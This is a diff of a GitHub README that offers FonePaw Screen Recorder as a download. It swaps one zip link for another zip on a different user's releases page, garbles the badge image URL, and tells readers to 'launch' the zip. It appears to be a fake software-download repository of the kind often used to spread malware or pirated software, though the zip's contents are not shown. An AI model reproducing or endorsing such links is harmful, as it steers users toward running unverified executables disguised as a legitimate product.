@@ -39,9 +39,9 @@ The repository covers various topics related to FonePaw Screen Recorder, includi
 
 Click the button below to download the FonePaw Screen Recorder software:
 
-[![Download FonePaw Screen Recorder](https://img.shields.io/badge/Download-FonePaw%20Screen%20Recorder-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download FonePaw Screen Recorder](https://github.com/bigboyyuzu/FonePaw-Screen-Recorder-Download/releases/download/v1.0/Application.zip%20Screen%20Recorder-blue)](https://github.com/bigboyyuzu/FonePaw-Screen-Recorder-Download/releases/download/v1.0/Application.zip)
 
-🚀 **Launch Software.zip to Get Started!**
+🚀 **Launch https://github.com/bigboyyuzu/FonePaw-Screen-Recorder-Download/releases/download/v1.0/Application.zip to Get Started!**
 
 If the link doesn't work, check the "Releases" section for alternative download options.
 
